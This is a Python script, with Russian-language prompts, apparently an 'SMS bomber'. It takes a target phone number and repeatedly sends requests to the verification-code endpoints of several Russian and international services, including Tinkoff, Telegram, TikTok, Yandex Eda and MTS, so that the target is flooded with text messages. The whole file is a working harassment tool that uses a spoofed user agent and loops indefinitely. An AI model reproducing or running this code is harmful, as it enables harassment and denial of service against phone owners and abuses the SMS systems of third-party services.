#-= It's just illusion =-#
import requests, random, time, fake_useragent, sys
from threading import Thread
from termcolor import colored
from update import *

user = fake_useragent.UserAgent().random
headers1 = {'user_agent': user}
version = '0.25'
iteration = 0
_name = ''

def internet_on():
	try:
		response = requests.get("http://www.google.com")
	except requests.ConnectionError:
		print(colored('У вас наверно проблемы с интеретом, перезагрузити скрипт, командой: ', 'red'), colored("'python bomber.py'", 'magenta'))
		sys.exit()

def normalizephone(phone):
    if '-' in  phone:
        phone = phone.replace('-', '')
    if ')' in  phone:
        phone = phone.replace(')', '')
    if '(' in  phone:
        phone = phone.replace('(', '')
    if '.' in  phone:
        phone = phone.replace('.', '')
    if '_' in  phone:
        phone = phone.replace('_', '')
    if '*' in  phone:
        phone = phone.replace('*', '')
    if " " in phone:
    	phone = phone.replace(" ", "")
    if phone[0] != "+":
    	if phone[0]== "8":
    		phone = phone.replace("8", "+7", 1)
    	else:
    		phone = "+7" + phone
    return phone

def zapros():
    global _phone
    global countT
    _phone = input('Ведите номер телефона>>: ')
    countT = input('Enter threading>>: ')

internet_on()
check_update(version)

print(colored('''
╋╋╋╋╋╋╋╋╋╋╋┏┓
╋╋╋╋╋╋╋╋╋╋╋┃┃
┏━━┳━┳━━┳━━┫┗━┓
┃┏┓┃┏┫┏┓┃━━┫┏┓┃
┃┗┛┃┃┃┏┓┣━━┃┃┃┃
┗━┓┣┛┗┛┗┻━━┻┛┗┛
┏━┛┃
┗━━┛
''', 'red'), colored('\nBeta 0.2', 'cyan'))

zapros()

phone = normalizephone(_phone)

for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))



print("\nЧто бы отменить нажмите Ctrl + C")
print('\n\n', colored('Т', 'grey'), colored('и', 'red'), colored('М', 'green'), colored('а', 'yellow'), ' ', colored('П', 'blue'), colored('и', 'magenta'), colored('Д', 'cyan'), colored('о', 'white'),  colored('Р', 'grey'), colored('а', 'red'),colored('С', 'green'))

def infinity():
	count = 0
	while True:
		request_timeout = 0.00001
		_phone = phone

		try:
			a = requests.post('https://www.citilink.ru/registration/confirm/phone/'+_phone+'/')
			count += 1
			print(colored('Citilink отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('Citilink  не отправлено!', 'red'))

		try:
			a = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			count += 1
			print(colored('ICQ отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('ICQ Не отправлено!', 'red'))

		try:
			a = requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			count += 1
			print(colored('Eda.Yandex отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('Eda.Yandex Не отправлено!', 'red'))

		try:
			a = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			count += 1
			print(colored('OK отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('OK Не отправлено!', 'red'))

		try:
			a = requests.post("https://my.modulbank.ru/api/v2/auth/phone", json={"CellPhone": _phone[1:]}, headers=headers1)
			count += 1
			print(colored('my.modulbank отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('my.modulbank не отправлено!', 'red'))

		try:
			a = requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",data={"phone":  _phone}, headers=headers1)
			count += 1
			print(colored('tinkoff отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('tinkoff не отправлено!', 'red'))

		try:
			a = requests.post("https://m.tiktok.com/node-a/send/download_link",  json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":_phone[2:],"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, headers=headers1)
			count += 1
			print(colored('tiktok отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('tiktok не отправлено!', 'red'))

		try:
			a = requests.post("https://my.telegram.org/auth/send_password", data={"phone": _phone}, headers=headers1)
			count += 1
			print(colored('telegram отправлено!', 'green'), colored(count, 'magenta'))
		except:
			print(colored('telegram не отправлено!', 'red'))

		try:
			requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
			count += 1
			print(colored('MTS отправлено!', 'green'), colored(count, 'magenta'))
		except:
		    print(colored('MTS не отправлено!', 'red'))

		print(colored('Список дошёл до конца', 'magenta'))
		time.sleep(10)

countT = Thread(target=infinity)
countT.start()
